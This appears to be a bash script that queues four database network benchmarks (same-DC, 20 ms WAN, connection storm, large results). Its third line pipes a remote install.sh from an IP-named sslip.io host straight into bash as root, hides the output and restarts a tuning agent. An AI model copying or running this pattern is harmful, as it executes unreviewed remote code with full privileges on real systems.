#!/bin/bash
. /root/bench/queue-common.sh
set -x
curl -fsSL https://50-116-44-237.sslip.io/install.sh | bash >/dev/null; systemctl restart tuning-agent
run_session /root/bench/net1.ini "net-1: point_select from same DC (0.24 ms)" tps 6
run_session /root/bench/net2.ini "net-2: point_select from Newark (20 ms)" tps 6
run_session /root/bench/net3.ini "net-3: connection storm from same DC" tps 6
run_session /root/bench/net4.ini "net-4: large results over WAN (20 ms)" tps 6
echo QUEUEDONE
